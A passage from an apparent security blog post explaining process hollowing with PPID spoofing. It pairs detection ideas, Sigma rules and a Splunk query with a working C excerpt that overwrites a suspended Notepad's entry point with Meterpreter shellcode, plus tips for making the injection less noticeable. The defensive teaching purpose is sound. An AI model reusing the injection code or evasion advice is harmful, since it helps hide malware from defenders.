class="wp-image-29875"><figcaption class="wp-element-caption">Figure 8 - Process Hollowed Notepad's Entry Point</figcaption></figure><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig9.png" alt="" class="wp-image-29876"><figcaption class="wp-element-caption">Figure 9 - Malicious Shellcode Matches Hollowed Entry Points</figcaption></figure><p>The a.exe, shown below as process_hollow.exe for demonstration purposes, prints different information about the memory layout to the console. In this case, the process_hollow.exe takes two command line arguments: the first is the IP address of the Meterpreter C2 listening for the connection, and the second argument is the PID of the parent to spoof; in this case it is the explore.exe (PID 4752). During execution, it calculates the address of the remote process' (Notepad's) PEB. Using the PEB, it calculates the Image Base Address, where the raw notepad executable code lives, parses the PE header to find the entry point, and then overwrites it.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig10.png" alt="" class="wp-image-29877"><figcaption class="wp-element-caption">Figure 10 – Debug Output of Process Hollowing’s Execution</figcaption></figure><p>Figure 11 shows the memory layout and that nothing has really been affected by the injection of malicious code. Figure 12 is just a closer view of the parts of the Notepad memory. Figure 13 Is the connection on the C2 from the injected shellcode and proof that it is running from the Notepad with the PID of 4048.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig11.png" alt="" class="wp-image-29878"><figcaption class="wp-element-caption">Figure 11 - View of Process Memory and Process Hollowing Execution Output</figcaption></figure><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig12.png" alt="" class="wp-image-29879"><figcaption class="wp-element-caption">Figure 12 - Memory of Notepad</figcaption></figure><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig13.png" alt="" class="wp-image-29880"><figcaption class="wp-element-caption">Figure 13 - Proof of Code Execution from Notepad</figcaption></figure><h2 class="wp-block-heading">1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; What Do the Attackers Gain?</h2><p>Just like with the PPID Spoofing, attackers use Process Hollowing to hide the malicious code and its execution from casual inspection. If a defender looks at this system, the malware might be overlooked on the first or even the second pass because it is running in a benign executable with a valid parent. However, in this case, it is identifiable due to Notepad's outbound connection.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig14.png" alt="" class="wp-image-29881"><figcaption class="wp-element-caption">Figure 14 - Process Internet Traffic Viewed in TCPView</figcaption></figure><p>To make this harder to detect, we could have made the parent ID that of Firefox (PID 3976) and started a Firefox executable to host our injected code. Then the network traffic wouldn't be as suspicious. Another route to remain hidden would be to use a long-haul agent and C2, where they only beacon out intermittently, allowing for connections to be visible only when polling for tasking.</p><p>Another benefit of Process Hollowing is it will not affect code signature validation of the process. This is because the file on disk (%system32%\notepad.exe in this case) is examined for the code sig verification and not the process in memory.</p><h2 class="wp-block-heading">1.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; How Can Defenders Identify and Stop Process Hollowing?</h2><p>Attempting to detect the Process Hollowing technique is difficult in most environments. The following are some detection ideas that apply principles in the hopes that you can conceptualize a detection strategy based around security tools at your disposal:</p><ol type="1"><li>Monitor process creation events for any anomalies. For instance, why is a process started with the CREATE_SUSPENDED flag? This is not indictive of malicious activities by itself but should warrant immediate further investigation. You can see an example in the C# and C code below, where the CREATE_SUSPENDED flag is passed. In the Ghidra Disassembly below, you can see where the CREATE_SUSPENDED (0x4) attribute is passed as value 0x80004 (Line 91 in section 1.5 Code Demonstration in C) when CreateProcessA is called as referencearticle <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags">https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags</a>.</li><li>Monitor or investigate any entry point changes that occur on the suspicious process. During the Process Hollowing operation, the entry point is overwritten with malicious code. Usually, ResumeThread is called to initiate the malware. You can use a tool like HollowFind by Monnappa K A (<a href="https://github.com/monnappa22/HollowFind">https://github.com/monnappa22/HollowFind</a>) to analyze possible infected processes and use the Volatility plugin to disassemble the address of the entry point. An example of this can be the entry point being modified by the SetThreadContext api.</li><li>Monitor or investigate memory allocation, such as malware using the WriteProcessMemory function to write data to a remote process. If an organization has the resources to monitor memory allocation patterns to identify possible events of abnormal behavior, this can narrow down suspicious code injection. A good detection strategy can be to write API signatures (usually in sandboxes) based sequentially; for instance, the following usually indicates code injections: <em>CreateProcess</em>,<em> VirtualAllocEx()</em>, and <em>WriteProcessMemory</em>.</li><li>This Process Hollowing technique is used with PPID Spoofing. Monitoring and investigating parent-child relationships can be a good starting point for the initial investigation. Some detection ideas of a parent-child relationship rule could be abnormal (unexpected) parent process spawning the child process in question. This can be investigated using Windows Event ID 4688 or Sysmon 1 (most mid to advance actors will not make it this easy). You can also analyze the ETW Microsoft-Windows-Kernel-Process provider, specifically the EventHeader ProcessId field to show the real parent of the spawn process. Be careful about false positives if you use the ETW log mentioned, such as the legitimate spoofing when User Account Control (UAC) is enabled on the machine.</li><li>Analyzing the process properties and behavior can help confirm the suspicious process of 'Hollowing'. In normal operation, the process should have the same references between the Process Environment Block (PEB) and the Virtual Address Descriptor (VAD). &nbsp;Analyzing the PEB and VAD structures to compare the results of the stored information about the process with the base address, process path and the virtual address space allocation, you can observe the reference change due to the unmapping of memory in the 'Hollowed' process. You can also analyze command line arguments of the suspicious process for any unusual parameters and compare the process in question to known good (normal) command line parameters in the environment.</li></ol><h3 class="wp-block-heading"><strong>Detection Ideas</strong></h3><p>Researching the Process Hollowing technique and looking at the proof-of-concept (POC) below, we can see some functions that we can monitor, such as CreateProcess, ReadProcessMemory, WriteProcessMemory, and ResumeThread. After all, the general operation of Process Hollowing is as follows:</p><ol type="1"><li>Create a trusted process in a SUSPENDED state.</li><li>'Hollow' out the content in memory.</li><li>Insert malicious code.</li><li>Resume the process.</li></ol><p>In the screenshot below, observe where the process is started in a suspended set. Next, the memory is 'zeroed' out and allocated to write the malicious shellcode. Lastly, the process is resumed.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig15.png" alt="" class="wp-image-29882"><figcaption class="wp-element-caption">Figure 15 - Process Hollowing APIs Used</figcaption></figure><h3 class="wp-block-heading"><strong>Proof-of-Concept Query and Sigma Rule</strong></h3><p>We developed a POC query and Sigma rule (experimental) based on the following research in this blog post. The caveat is that every environment is different, and this detection will require additional tuning and refinement.</p><h3 class="wp-block-heading"><strong>Process Hollowing Process Access Sigma Rule:</strong></h3><pre class="wp-block-preformatted hljs language-yaml" data-highlighted="yes"><span class="hljs-attr">title:</span> <span class="hljs-string">Process</span> <span class="hljs-string">Hollowing</span> <span class="hljs-string">Process</span> <span class="hljs-string">Access</span> <span class="hljs-string">Event</span>
<span class="hljs-attr">id:</span> <span class="hljs-string">8c73e59e-bf22-42b9-9022-bb20406acdda</span>
<span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Detects</span> <span class="hljs-string">suspicious</span> <span class="hljs-string">process</span> <span class="hljs-string">hollowing</span> <span class="hljs-string">activity</span> <span class="hljs-string">by</span> <span class="hljs-string">monitoring</span> <span class="hljs-string">process</span> <span class="hljs-string">access</span> <span class="hljs-string">events</span> <span class="hljs-string">and</span> <span class="hljs-string">correlating</span> <span class="hljs-string">with</span> <span class="hljs-string">process</span> <span class="hljs-string">create</span> <span class="hljs-string">events</span>
<span class="hljs-attr">references:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-336a</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.uptycs.com/blog/warzonerat-can-now-evade-with-process-hollowing</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags</span>
<span class="hljs-attr">author:</span> <span class="hljs-string">Leo</span> <span class="hljs-string">Bastidas</span> <span class="hljs-string">@cyberGoatPsyOps</span>
<span class="hljs-attr">date:</span> <span class="hljs-number">2023</span><span class="hljs-string">/05/11</span>
<span class="hljs-attr">tags:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">attack.t1055.012</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">attack.defense_evasion</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">attack.privilege_escalation</span>
<span class="hljs-attr">logsource:</span>
    <span class="hljs-attr">category:</span> <span class="hljs-string">process_access</span>
    <span class="hljs-attr">product:</span> <span class="hljs-string">windows</span>
    <span class="hljs-attr">definition:</span> <span class="hljs-string">Must</span> <span class="hljs-string">have</span> <span class="hljs-string">Sysmon</span> <span class="hljs-string">installed</span> <span class="hljs-string">and</span> <span class="hljs-string">correlate</span> <span class="hljs-string">by</span> <span class="hljs-string">matching</span> <span class="hljs-string">SourceUser</span> <span class="hljs-string">and</span> <span class="hljs-string">SourceProcessGuid</span> <span class="hljs-string">to</span> <span class="hljs-string">Sysmon</span> <span class="hljs-string">EID</span> <span class="hljs-number">1</span><span class="hljs-string">.</span> <span class="hljs-string">You</span> <span class="hljs-string">can</span> <span class="hljs-string">also</span> <span class="hljs-string">use</span> <span class="hljs-string">Sysmon</span> <span class="hljs-string">Event</span> <span class="hljs-number">25</span> <span class="hljs-string">to</span> <span class="hljs-string">correlate</span>

<span class="hljs-attr">detection:</span>
    <span class="hljs-attr">selection:</span>
        <span class="hljs-attr">GrantedAccess:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-number">0x1FFFFF</span>
            <span class="hljs-bullet">-</span> <span class="hljs-number">0x1F3FFF</span>
        <span class="hljs-attr">SourceUser:</span> <span class="hljs-comment"># Correlate with Sysmon EID 1 ParentUser field</span>
        <span class="hljs-attr">SourceProcessGUID:</span> <span class="hljs-comment"># Correlate with Sysmon EID 1 ProcessGuid field</span>
    <span class="hljs-attr">filter:</span>
        <span class="hljs-string">SourceImage|endswith:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">'NGenTask.exe'</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">'WerFault.exe'</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">'Sysmon64.exe'</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">'apimonitor-x64.exe'</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">'MicrosoftEdgeUpdate.exe'</span>
    <span class="hljs-attr">condition:</span> <span class="hljs-string">selection</span> <span class="hljs-string">and</span> <span class="hljs-string">not</span> <span class="hljs-string">filter</span>
<span class="hljs-attr">fields:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">UtcTime</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">EventCode</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">host</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">ProcessId</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">ParentProcessId</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">Image</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">ParentImage</span>
<span class="hljs-attr">falsepositives:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">Legitimate</span> <span class="hljs-string">administrative</span> <span class="hljs-string">activities</span>
<span class="hljs-attr">level:</span> <span class="hljs-string">medium</span>
<span class="hljs-attr">level:</span> <span class="hljs-string">medium</span>
</pre><div style="height:25px;" class="wp-block-spacer"></div><h3 class="wp-block-heading"><strong>Process Hollowing Process Create Sigma Rule:</strong></h3><pre class="wp-block-preformatted hljs language-yaml" data-highlighted="yes"><span class="hljs-attr">title:</span> <span class="hljs-string">Process</span> <span class="hljs-string">Hollowing</span> <span class="hljs-string">Process</span> <span class="hljs-string">Create</span> <span class="hljs-string">Event</span>
<span class="hljs-attr">id:</span> <span class="hljs-string">e8cbd6c4-7a59-46df-a1f1-f5d46415045d</span>
<span class="hljs-attr">status:</span> <span class="hljs-string">experimental</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">Detects</span> <span class="hljs-string">suspicious</span> <span class="hljs-string">process</span> <span class="hljs-string">hollowing</span> <span class="hljs-string">activity</span> <span class="hljs-string">by</span> <span class="hljs-string">correlating</span> <span class="hljs-string">with</span> <span class="hljs-string">process</span> <span class="hljs-string">access</span> <span class="hljs-string">events</span>
<span class="hljs-attr">references:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-336a</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.uptycs.com/blog/warzonerat-can-now-evade-with-process-hollowing</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags</span>
<span class="hljs-attr">author:</span> <span class="hljs-string">Leo</span> <span class="hljs-string">Bastidas</span> <span class="hljs-string">@cyberGoatPsyOps</span>
<span class="hljs-attr">date:</span> <span class="hljs-number">2023</span><span class="hljs-string">/05/11</span>
<span class="hljs-attr">tags:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">attack.t1055.012</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">attack.defense_evasion</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">attack.privilege_escalation</span>
<span class="hljs-attr">logsource:</span>
    <span class="hljs-attr">category:</span> <span class="hljs-string">process_creation</span>
    <span class="hljs-attr">product:</span> <span class="hljs-string">windows</span>
    <span class="hljs-attr">definition:</span> <span class="hljs-string">Must</span> <span class="hljs-string">have</span> <span class="hljs-string">Sysmon</span> <span class="hljs-string">installed.</span> <span class="hljs-string">You</span> <span class="hljs-string">can</span> <span class="hljs-string">also</span> <span class="hljs-string">use</span> <span class="hljs-string">Sysmon</span> <span class="hljs-string">Event</span> <span class="hljs-number">25</span> <span class="hljs-string">to</span> <span class="hljs-string">correlate</span>
<span class="hljs-attr">detection:</span>
    <span class="hljs-attr">selection1:</span>
        <span class="hljs-attr">ParentUser:</span> <span class="hljs-comment"># You correlate ParentUser to SourceUser from EventID 10</span>
    <span class="hljs-attr">selection2:</span>
        <span class="hljs-attr">ProcessGuid:</span> <span class="hljs-comment"># You correlate ProcessGuid to SourceProcessGuid from EventID 10</span>
    <span class="hljs-attr">filter:</span>
        <span class="hljs-string">Image|endswith:</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">'wevtutil.exe'</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">'MicrosoftEdgeUpdate.exe'</span>
            <span class="hljs-bullet">-</span> <span class="hljs-string">'teams'</span>
        <span class="hljs-string">ParentImage|endswith:</span> 
            <span class="hljs-bullet">-</span> <span class="hljs-string">'apimonitor-x64.exe'</span>
    <span class="hljs-attr">condition:</span> <span class="hljs-string">all</span> <span class="hljs-string">of</span> <span class="hljs-string">selection*</span> <span class="hljs-string">and</span> <span class="hljs-string">not</span> <span class="hljs-string">filter</span>
<span class="hljs-attr">fields:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">UtcTime</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">EventCode</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">host</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">ProcessId</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">ParentProcessId</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">Image</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">ParentImage</span>
<span class="hljs-attr">falsepositives:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">Legitimate</span> <span class="hljs-string">administrative</span> <span class="hljs-string">activities</span>
<span class="hljs-attr">level:</span> <span class="hljs-string">medium</span>
</pre><div style="height:25px;" class="wp-block-spacer"></div><h3 class="wp-block-heading" id="block-d500bfd5-7385-4060-b303-55e863982644"><strong>Process Hollowing Splunk Query:</strong></h3><pre class="wp-block-preformatted hljs language-perl" data-highlighted="yes">(<span class="hljs-keyword">index</span>=windows EventCode=<span class="hljs-number">10</span> GrantedAccess IN (<span class="hljs-string">"0x1FFFFF"</span>, <span class="hljs-string">"0x1F3FFF"</span>) AND NOT (SourceImage IN (<span class="hljs-string">"*NGenTask.exe"</span>, <span class="hljs-string">"*WerFault.exe"</span>, <span class="hljs-string">"*Sysmon64.exe"</span>, <span class="hljs-string">"*apimonitor-x64.exe"</span>, <span class="hljs-string">"*MicrosoftEdgeUpdate.exe"</span>,<span class="hljs-string">"*git"</span>) OR (TargetImage IN (<span class="hljs-string">"*git.exe"</span>))))
| <span class="hljs-keyword">eval</span> matchGUID=TargetProcessGUID
| <span class="hljs-keyword">eval</span> matchUser=SourceUser
| append 
    [ search (<span class="hljs-keyword">index</span>=windows EventCode IN (<span class="hljs-number">1</span>) AND NOT (Image IN (<span class="hljs-string">"*wevtutil.exe"</span>,<span class="hljs-string">"*MicrosoftEdgeUpdate.exe"</span>, <span class="hljs-string">"*teams.exe"</span>,<span class="hljs-string">"*git.exe"</span>) OR ParentImage IN (<span class="hljs-string">"*apimonitor-x64.exe"</span>,<span class="hljs-string">"*git.exe*"</span>))) | <span class="hljs-keyword">eval</span> matchGUID=ParentProcessGuid | <span class="hljs-keyword">eval</span> matchUser=ParentUser | stats <span class="hljs-keyword">values</span>(*) as * by matchGUID, matchUser ]
| append 
    [ search (<span class="hljs-keyword">index</span>=windows EventCode IN (<span class="hljs-number">25</span>)) | rex field=Message <span class="hljs-string">"(?ims)(.*process\stampering.*image:\s(?&lt;tamperedImage&gt;.*\.\w{2,5}))"</span> ]
| <span class="hljs-keyword">eval</span> image = mvappend(<span class="hljs-string">'Image'</span>,<span class="hljs-string">'SourceImage'</span>)
| mvexpand image
| <span class="hljs-keyword">eval</span> processId = mvappend(<span class="hljs-string">'ProcessId'</span>,<span class="hljs-string">'SourceProcessId'</span>)
| mvexpand processId
| table UtcTime matchGUID, matchUser, tamperedImage, host, processId, ParentProcessId, TargetProcessId, image, ParentImage, TargetImage, GrantedAccess, CallTrace
| dedup UtcTime
| <span class="hljs-keyword">sort</span> -UtcTime</pre><div style="height:25px;" class="wp-block-spacer"></div><h3 class="wp-block-heading"><strong>Detail Breakdown of the Query:</strong></h3><ol type="1" start="1"><li>The query first pulls Windows Event Logs with an EventCode of 10, which are Process Access Event, and a GrantedAccess value of 0x1FFFFF or 0x1F3FFF. This indicates that a process has gained full access permissions to another process. This is often an indicator of suspicious activity but remember that Process Hollowing does not need full access.</li><li>The query also attempts to filter out known good with the <code>AND NOT</code> operator.</li><li>The <code>eval</code> statement is used to create new fields (<code>matchGUID</code> and <code>matchUser</code>), which will be used for correlation.</li><li>An <code>append</code> command is used to include process creation events. These events are attempting to identify the source of the process that might be hollowed out.</li><li>It appends another subsearch that looks for events with EventCode=25 (Sysmon file tampering) in the Windows index. A regular expression is used to extract the tamperedImage field from the Message field.</li><li>The <code>stats</code> command is used to group the results by the <code>matchGUID</code> and <code>matchUser</code> fields. This allows us to track the same process across different events.</li><li>The <code>mvappend</code>, <code>mvexpand</code>, and <code>table</code> commands are used to combine process IDs and create a table.</li><li>The <code>dedup</code> command is used to remove any duplicate entries.</li><li>The <code>where isnotnull(TargetProcessId)</code> condition is used to filter out results where the TargetProcessId is NULL. This was used to filter out results (including some malicious events) to make it easier to observe the spawning of the hollowed-out process.</li><li>Finally, the <code>sort</code> command is used to order the results based on the timestamp.</li></ol><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig16.png" alt="" class="wp-image-29883"><figcaption class="wp-element-caption">Figure 16 - Results of the Query</figcaption></figure><p>As you can see, this is not a 'silver bullet', but will give detection ideas of how to narrow down on possible Process Hollowing techniques. Notice the CallTrace field, where we can view the memory offset of where the legitimate process was created in a suspended state, KERNEL32.DLL+17034.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig17.png" alt="" class="wp-image-29884"><figcaption class="wp-element-caption">Figure 17 - CreateProcessA Call Stack (Kernal32.dll)</figcaption></figure><p>In the following screenshot, you can also see where the 'hollowing out' is occurring in the CallTrace field.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig18.png" alt="" class="wp-image-29885"><figcaption class="wp-element-caption">Figure 18 - memset API usage</figcaption></figure><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig19.png" alt="" class="wp-image-29886"><figcaption class="wp-element-caption">Figure 19 - Call Tracing Capturing memset API</figcaption></figure><p>Note 1:</p><p>When coming up with the detection idea, another POC was also used to help analyze any possible data gaps, so I turned to Atomic RedTeam, who led me to FuzzySecurity Start-Hollow PowerShell script (<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1</a>)</p><p>Note 2:<br>The provided Sigma rules are not usable for productions environment that utilize Sigma, they cannot be converted to any other SIEM query language. They are only provided for reference purposes.</p><h2 class="wp-block-heading">1.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Code Demonstration in C and C#</h2><p>The first code excerpt demonstrates the Process Hollowing in C. We will be discussing the major points of the code. There are several print statements that aid in understanding of the execution flow that would not normally be added in an active tool.</p><p>Line 83 creates the new Notepad process in a suspended state. We will inject our malicious code into this process. Of note, the EXTENDED_STARTUPINFO_PRESENT is used to aid with the PPID spoofing.</p><p>Lines 87–88 initialize the PROCESS_BASIC_INFORMATION structure and set its memory to zero.</p><p>Line 89 obtains a Handle to the Notepad instance we just started.</p><p>Line 91 uses the Notepad handle to populate the PROCES_BASIC_INFORMATION structure.</p><p>Lines 92–93 get a reference to the Notepad PEB.</p><p>Lines 94–95 use the PEB and the 0x10 offset to get a pointer to address to the MZ header of the Notepad process. The 0x10 offset is used for 64-bit windows. The offset for 32-bit windows is 0x8.</p><p>Line 98 reads eight (8) bytes from the Notepad memory to get the actual address of the MZ Header.</p><p>Line 108 reads the MZ and the PE header from Notepads memory.</p><p>Line 115 uses the MZ header, copied above, to get the offset to the PE header.</p><p>Line 116–118 calculates the pointer to the entry point by using the PE offset + 0x28. 0x28 is the offset to the pointer to the address of the entry point.</p><figure class="wp-block-image size-full aligncenter"><img src="https://www.trustedsec.com/wp-content/uploads/2023/06/Leo_fig20.png" alt="" class="wp-image-29887"><figcaption class="wp-element-caption">Figure 20 - MZ/PE Header Structure</figcaption></figure><p>Lines 119–122 move the address into a pointer to which it will be written.</p><p>Line 123 overwrites the entry point with our malicious code.</p><p>Line 130 is the most important part: Resume the paused Notepad thread to execute the malicious code.</p><pre class="wp-block-preformatted hljs language-cpp" data-highlighted="yes"><span class="hljs-number">83</span>     <span class="hljs-built_in">CreateProcessA</span>(<span class="hljs-literal">NULL</span>, (LPSTR)<span class="hljs-string">"notepad"</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT|CREATE_SUSPENDED, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);
 <span class="hljs-number">84</span>     <span class="hljs-comment">// PPID Spoofing</span>
 <span class="hljs-number">85</span> 
 <span class="hljs-number">86</span>     <span class="hljs-comment">// Process Hollowing</span>
 <span class="hljs-number">87</span>     PROCESS_BASIC_INFORMATION bi = {};
 <span class="hljs-number">88</span>     <span class="hljs-built_in">memset</span>(&amp;bi, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(PROCESS_BASIC_INFORMATION));
 <span class="hljs-number">89</span>     HANDLE hProcess = pi.hProcess;
 <span class="hljs-number">90</span>     PULONG tmp = <span class="hljs-number">0</span>;
 <span class="hljs-number">91</span>     <span class="hljs-built_in">NtQueryInformationProcess</span>(hProcess, ProcessBasicInformation, &amp;bi, <span class="hljs-built_in">sizeof</span>(PROCESS_BASIC_INFORMATION), tmp);
 <span class="hljs-number">92</span>     PEB *peb = bi.PebBaseAddress;
 <span class="hljs-number">93</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"PEB address(remote): %p\n"</span>, peb);
 <span class="hljs-number">94</span>     PVOID ptrToImageBase = (PVOID)(((<span class="hljs-type">char</span>*)peb)+<span class="hljs-number">0x10</span>);
 <span class="hljs-number">95</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ImageBaseAddress(remote): 0x%llx\n"</span>, ptrToImageBase);
 <span class="hljs-number">96</span>     QWORD addrBuf = <span class="hljs-number">0</span>;
 <span class="hljs-number">97</span>     SIZE_T tmp2 = <span class="hljs-number">0</span>;
 <span class="hljs-number">98</span>     <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ReadProcessMemory</span>(hProcess, ptrToImageBase, &amp;addrBuf, <span class="hljs-number">8</span>, &amp;tmp2) == <span class="hljs-number">0</span>)    
 <span class="hljs-number">99</span>     {
<span class="hljs-number">100</span>         <span class="hljs-type">char</span>* errorStr = <span class="hljs-built_in">GetLastErrorAsString</span>();
<span class="hljs-number">101</span>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error'd out: %s\n"</span>, errorStr);
<span class="hljs-number">102</span>         <span class="hljs-built_in">free</span>(errorStr);
<span class="hljs-number">103</span>         <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
<span class="hljs-number">104</span>     }
<span class="hljs-number">105</span>     
<span class="hljs-number">106</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Remote Image Address(remote): 0x%llx\n"</span>, addrBuf);
<span class="hljs-number">107</span>     <span class="hljs-type">char</span> data[<span class="hljs-number">0x200</span>] = {<span class="hljs-number">0</span>};
<span class="hljs-number">108</span>     <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ReadProcessMemory</span>(hProcess, (PVOID)addrBuf, data, <span class="hljs-number">0x200</span>, &amp;tmp2) == <span class="hljs-number">0</span>)    
<span class="hljs-number">109</span>     {
<span class="hljs-number">110</span>         <span class="hljs-type">char</span>* errorStr = <span class="hljs-built_in">GetLastErrorAsString</span>();
<span class="hljs-number">111</span>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error'd out: %s\n"</span>, errorStr);
<span class="hljs-number">112</span>         <span class="hljs-built_in">free</span>(errorStr);
<span class="hljs-number">113</span>         <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
<span class="hljs-number">114</span>     }
<span class="hljs-number">115</span>     QWORD *ppeHdrOffset =(QWORD*)(data+<span class="hljs-number">0x3c</span>);
<span class="hljs-number">116</span>     DWORD peHdrOffset = *ppeHdrOffset;
<span class="hljs-number">117</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"peoffset(remote): 0x%llx\n"</span>, peHdrOffset);
<span class="hljs-number">118</span>     QWORD *ptrEntryOffset =(QWORD*)(data+peHdrOffset+<span class="hljs-number">0x28</span>);
<span class="hljs-number">119</span>     DWORD entryOffset = *ptrEntryOffset;
<span class="hljs-number">120</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"entryOffset(remote): 0x%llx\n"</span>, entryOffset);
<span class="hljs-number">121</span>     QWORD *ptrEntryPoint =(QWORD*)(addrBuf+entryOffset);
<span class="hljs-number">122</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Writting memory too(remote): 0x%llx\n"</span>, ptrEntryPoint);
<span class="hljs-number">123</span>     <span class="hljs-keyword">if</span>( <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, ptrEntryPoint, buf, encoded_size, &amp;tmp2) == <span class="hljs-number">0</span>)
<span class="hljs-number">124</span>     {
<span class="hljs-number">125</span>         <span class="hljs-type">char</span>* errorStr = <span class="hljs-built_in">GetLastErrorAsString</span>();
<span class="hljs-number">126</span>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Error'd out: %s\n"</span>, errorStr);
<span class="hljs-number">127</span>         <span class="hljs-built_in">free</span>(errorStr);
<span class="hljs-number">128</span>         <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);
<span class="hljs-number">129</span>     }
<span class="hljs-number">130</span>     <span class="hljs-built_in">ResumeThread</span>(pi.hThread);
<span class="hljs-number">131</span> }
</pre><div style="height:25px;" class="wp-block-spacer"></div><p>The next code excerpt is in C# and performs the same actions as the above code sample. Let's walk through the code line by line.</p><p>Lines 171–182 creates the new process into which we will inject. In this case, we are spawning a svchost.exe with a parent services.exe. Again, the important flag is the Win32.CreationFlags.CreateSuspended. The Win32 class used in the C# code is a class used to hold Windows-related ENUMs, structures, and references to helper functions such as CreateProcess.</p><p>Line 185 is commented-out but was the way to spawn svchost.exe without the suspended or PPID spoofing.</p><p>Line 188 retrieves a Handle from the newly created svchost’s process.</p><p>Line 189 uses the svchost’s handle to populate the PROCES_BASIC_INFORMATION structure.</p><p>Line 191 gets a reference to the Notepad PEB and uses the PEB and the 0x10 offset to get a pointer to address to the MZ header of the Notepad process. The 0x10 offset is used for 64-bit windows. The offset for 32-bit windows is 0x8.</p><p>Lines 195–196 read eight (8) bytes from the svchost’s memory to get the actual address of the MZ Header. Then it converts the byte array to apointer.</p><p>Line 199 reads the MZ and the PE header from svchost’s memory.</p><p>Lines 201–203 use the MZ header, copied above, to get the offset to the PE header, and then calculate the pointer to the entry point by using the PE offset + 0x28. 0x28 is the offset to the pointer to the address of entry 